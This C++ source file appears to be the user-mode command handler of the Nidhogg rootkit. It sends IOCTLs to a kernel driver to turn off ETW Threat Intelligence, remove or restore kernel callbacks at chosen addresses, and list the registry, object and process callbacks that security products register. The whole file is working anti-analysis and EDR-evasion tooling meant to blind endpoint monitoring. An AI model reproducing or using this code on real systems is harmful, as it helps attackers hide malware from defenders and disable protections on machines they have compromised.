#include "pch.h"
#include "AntiAnalysisHandler.h"

/*
* Description:
* HandleCommand is responsible for handling an anti analysis related command.
*
* Parameters:
* @command [_In_ std::string] -- The command to be handled.
*
* Returns:
* There is no return value.
*/
void AntiAnalysisHandler::HandleCommand(_In_ std::string command) {
	std::vector<std::string> params = SplitStringBySpace(command);
	std::string commandName = params.at(0);
	params.erase(params.begin());

	if (commandName.compare("enable_etwti") == 0) {
		if (params.size() != 1) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		if (!EnableDisableEtwTi(true)) {
			std::cerr << "Failed to enable ETW-TI" << std::endl;
			return;
		}
		std::cout << "ETW-TI enabled successfully" << std::endl;
	}
	else if (commandName.compare("disable_etwti") == 0) {
		if (params.size() != 1) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		if (!EnableDisableEtwTi(false)) {
			std::cerr << "Failed to disable ETW-TI" << std::endl;
			return;
		}
		std::cout << "ETW-TI disabled successfully" << std::endl;
	}
	else if (commandName.compare("remove_callback") == 0) {
		DWORD64 callbackAddress = 0;

		if (params.size() != 3) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		try {
			callbackAddress = ConvertToNumber<std::string, DWORD64>(params.at(1));
		}
		catch (const ConvertorException& e) {
			std::cerr << e.what() << std::endl;
			PrintHelp();
			return;
		}
		if (callbackTypeMap.find(params.at(2)) == callbackTypeMap.end()) {
			std::cerr << "Invalid callback type" << std::endl;
			PrintHelp();
			return;
		}

		if (!IsValidKmMemory(callbackAddress)) {
			std::cerr << "Invalid callback address" << std::endl;
			PrintHelp();
			return;
		}
		if (!RemoveCallback(callbackAddress, callbackTypeMap.at(params.at(2)), true)) {
			std::cerr << "Failed to remove callback 0x" << std::hex << callbackAddress << " of type " << params.at(2) << std::endl;
			std::cout << std::dec << std::endl;
			return;
		}
		std::cout << "Callback 0x" << std::hex << callbackAddress << " of type " << params.at(2) << " removed successfully" << std::endl;
		std::cout << std::dec << std::endl;
	}
	else if (commandName.compare("restore_callback") == 0) {
		DWORD64 callbackAddress = 0;

		if (params.size() != 3) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		try {
			callbackAddress = ConvertToNumber<std::string, DWORD64>(params.at(1));
		}
		catch (const ConvertorException& e) {
			std::cerr << e.what() << std::endl;
			PrintHelp();
			return;
		}
		if (callbackTypeMap.find(params.at(2)) == callbackTypeMap.end()) {
			std::cerr << "Invalid callback type" << std::endl;
			PrintHelp();
			return;
		}

		if (!IsValidKmMemory(callbackAddress)) {
			std::cerr << "Invalid callback address" << std::endl;
			PrintHelp();
			return;
		}
		if (!RemoveCallback(callbackAddress, callbackTypeMap.at(params.at(2)), false)) {
			std::cerr << "Failed to restore callback 0x" << std::hex << callbackAddress << " of type " << params.at(2) << std::endl;
			std::cout << std::dec << std::endl;
			return;
		}
		std::cout << "Callback 0x" << std::hex << callbackAddress << " of type " << params.at(2) << " restored successfully" << std::endl;
		std::cout << std::dec << std::endl;
	}
	else if (commandName.compare("list_registry_callbacks") == 0) {
		CmCallbacksList callbacks;
		CmCallback currentCallback;

		if (params.size() != 1) {
			PrintHelp();
			return;
		}
		
		try {
			callbacks = ListRegistryCallbacks();
		}
		catch (const AntiAnalysisHandlerException& e) {
			std::cerr << e.what() << std::endl;
			return;
		}

		if (callbacks.NumberOfCallbacks == 0) {
			std::cerr << "No registry callbacks found or failed to list them" << std::endl;
			return;
		}
		std::cout << "Registry Callbacks:" << std::endl;

		for (ULONG i = 0; i < callbacks.NumberOfCallbacks; i++) {
			currentCallback = callbacks.Callbacks[i];

			if (currentCallback.DriverName)
				std::cout << "Driver Name: " << currentCallback.DriverName << std::endl;
			else
				std::cout << "Driver Name: Unknown" << std::endl;
			std::cout << "\tCallback: " << std::hex << currentCallback.CallbackAddress << std::endl;
			std::cout << "\tContext: " << std::hex << currentCallback.Context << std::endl;
		}
		std::cout << std::dec << std::endl;
		SafeFree(callbacks.Callbacks);
	}
	else if (commandName.compare("list_ob_callbacks") == 0) {
		ObCallbacksList callbacks;

		if (params.size() != 2) {
			PrintHelp();
			return;
		}
		if (!params.at(1).starts_with("Ob") || callbackTypeMap.find(params.at(1)) == callbackTypeMap.end()) {
			std::cerr << "Invalid callback type" << std::endl;
			PrintHelp();
			return;
		}
		try {
			callbacks = ListObCallbacks(callbackTypeMap.at(params.at(1)));
		}
		catch (const AntiAnalysisHandlerException& e) {
			std::cerr << e.what() << std::endl;
			return;
		}

		if (callbacks.NumberOfCallbacks == 0) {
			std::cerr << "No object callbacks found or failed to list them" << std::endl;
			return;
		}
		std::cout << "Object callbacks of type " << params.at(1) << ":" << std::endl;

		for (ULONG i = 0; i < callbacks.NumberOfCallbacks; ++i) {
			if (callbacks.Callbacks[i].DriverName)
				std::cout << "Driver Name: " << callbacks.Callbacks[i].DriverName << std::endl;
			else
				std::cout << "Driver Name: Unknown" << std::endl;
			std::cout << "\tPre Operation Callback: " << std::hex << callbacks.Callbacks[i].PreOperation << std::endl;
			std::cout << "\tPost Operation Callback: " << std::hex << callbacks.Callbacks[i].PostOperation << std::endl;
		}
		std::cout << std::dec << std::endl;
		SafeFree(callbacks.Callbacks);
	}
	else if (commandName.compare("list_ps_routines") == 0) {
		PsRoutinesList routines;

		if (params.size() != 2) {
			PrintHelp();
			return;
		}
		if (!params.at(1).starts_with("Ps") || callbackTypeMap.find(params.at(1)) == callbackTypeMap.end()) {
			std::cerr << "Invalid callback type" << std::endl;
			PrintHelp();
			return;
		}
		try {
			routines = ListPsRoutines(callbackTypeMap.at(params.at(1)));
		}
		catch (const AntiAnalysisHandlerException& e) {
			std::cerr << e.what() << std::endl;
			return;
		}

		if (routines.NumberOfRoutines == 0) {
			std::cerr << "No PS routines found or failed to list them" << std::endl;
			return;
		}
		std::cout << "PS routines of type " << params.at(1) << ":" << std::endl;

		for (ULONG i = 0; i < routines.NumberOfRoutines; ++i) {
			
			if (routines.Routines[i].DriverName)
				std::cout << "Driver Name: " << routines.Routines[i].DriverName << std::endl;
			else
				std::cout << "Driver Name: Unknown" << std::endl;
			std::cout << "\tRoutine: " << std::hex << routines.Routines[i].CallbackAddress << std::endl;
		}
		std::cout << std::dec << std::endl;
		SafeFree(routines.Routines);
	}
	else {
		std::cerr << "Unknown command: " << commandName << std::endl;
		PrintHelp();
		return;
	}
}

/*
* Description:
* EnableDisableEtwTi is responsible for enabling or disabling ETW-TI.
* 
* Parameters:
* @enable [_In_ bool] -- Whether to enable or disable ETW-TI.
* 
* Returns:
* @bool				  -- Whether the operation was successful or not.
*/
bool AntiAnalysisHandler::EnableDisableEtwTi(_In_ bool enable) {
	DWORD returned = 0;
	return DeviceIoControl(hNidhogg.get(), IOCTL_ENABLE_DISABLE_ETWTI, &enable, sizeof(enable), nullptr, 0, &returned, nullptr);
}

/*
* Description:
* RemoveCallback is responsible for removing or restoring a callback.
* 
* Parameters:
* @callbackAddress [_In_ ULONG64]	   -- The address of the callback to be removed or restored.
* @callbackType	   [_In_ CallbackType] -- The type of the callback to be removed or restored.
* @remove		   [_In_ bool]		   -- Whether to remove or restore the callback.
* 
* Returns:
* @bool								   -- Whether the operation was successful or not.
*/
bool AntiAnalysisHandler::RemoveCallback(_In_ ULONG64 callbackAddress, _In_ CallbackType callbackType, _In_ bool remove) {
	KernelCallback callback{};
	DWORD returned = 0;

	callback.CallbackAddress = callbackAddress;
	callback.Type = callbackType;
	callback.Remove = remove;
	return DeviceIoControl(hNidhogg.get(), IOCTL_REMOVE_RESTORE_CALLBACK, &callback, sizeof(callback), nullptr, 0, &returned, nullptr);
}

/*
* Description:
* ListRegistryCallbacks is responsible for listing all registry callbacks.
* 
* Parameters:
* There are no parameters.
* 
* Returns:
* @CmCallbacksList -- A list of registry callbacks.
*/
CmCallbacksList AntiAnalysisHandler::ListRegistryCallbacks() {
	CmCallbacksList callbacks{};
	DWORD returned = 0;

	try {
		callbacks.Callbacks = SafeAlloc<CmCallback*>(MAX_ROUTINES * sizeof(CmCallback));
	}
	catch (const SafeMemoryException& e) {
		throw AntiAnalysisHandlerException(e.what());
	}

	if (!DeviceIoControl(hNidhogg.get(), IOCTL_LIST_REGCALLBACKS, &callbacks, sizeof(callbacks), &callbacks, sizeof(callbacks), &returned, nullptr)) {
		SafeFree(callbacks.Callbacks);
		throw AntiAnalysisHandlerException("Failed to list registry callbacks");
	}
	return callbacks;
}

/*
* Description:
* ListObCallbacks is responsible for listing all object callbacks of a specific type.
* 
* Parameters:
* @callbackType [_In_ CallbackType] -- The type of object callbacks to be listed.
* 
* Returns:
* @ObCallbacksList -- A list of object callbacks.
*/
ObCallbacksList AntiAnalysisHandler::ListObCallbacks(_In_ CallbackType callbackType) {
	ObCallbacksList callbacks{};
	DWORD returned = 0;
	callbacks.Type = callbackType;
	callbacks.NumberOfCallbacks = 0;

	if (!DeviceIoControl(hNidhogg.get(), IOCTL_LIST_OBCALLBACKS, &callbacks, sizeof(callbacks), &callbacks, sizeof(callbacks), &returned, nullptr))
		throw AntiAnalysisHandlerException("Failed to list object callbacks");

	if (callbacks.NumberOfCallbacks > 0) {
		try {
			callbacks.Callbacks = SafeAlloc<ObCallback*>(callbacks.NumberOfCallbacks * sizeof(ObCallback));
		}
		catch (const SafeMemoryException& e) {
			throw AntiAnalysisHandlerException(e.what());
		}
		if (!DeviceIoControl(hNidhogg.get(), IOCTL_LIST_OBCALLBACKS, &callbacks, sizeof(callbacks), &callbacks, sizeof(callbacks), &returned, nullptr)) {
			SafeFree(callbacks.Callbacks);
			throw AntiAnalysisHandlerException("Failed to list object callbacks");
		}
	}
	return callbacks;
}

/*
* Description:
* ListPsRoutines is responsible for listing all PS routines of a specific type.
* 
* Parameters:
* @callbackType [_In_ CallbackType] -- The type of PS routines to be listed.
* 
* Returns:
* @PsRoutinesList -- A list of PS routines.
*/
PsRoutinesList AntiAnalysisHandler::ListPsRoutines(_In_ CallbackType callbackType) {
	PsRoutinesList routines{};
	DWORD returned = 0;

	try {
		routines.Routines = SafeAlloc<PsRoutine*>(MAX_ROUTINES * sizeof(PsRoutine));
	}
	catch (const SafeMemoryException& e) {
		throw AntiAnalysisHandlerException(e.what());
	}

	if (!DeviceIoControl(hNidhogg.get(), IOCTL_LIST_PSROUTINES, &routines, sizeof(routines), &routines, sizeof(routines), &returned, nullptr)) {
		SafeFree(routines.Routines);
		throw AntiAnalysisHandlerException("Failed to list ps routines");
	}
	return routines;
}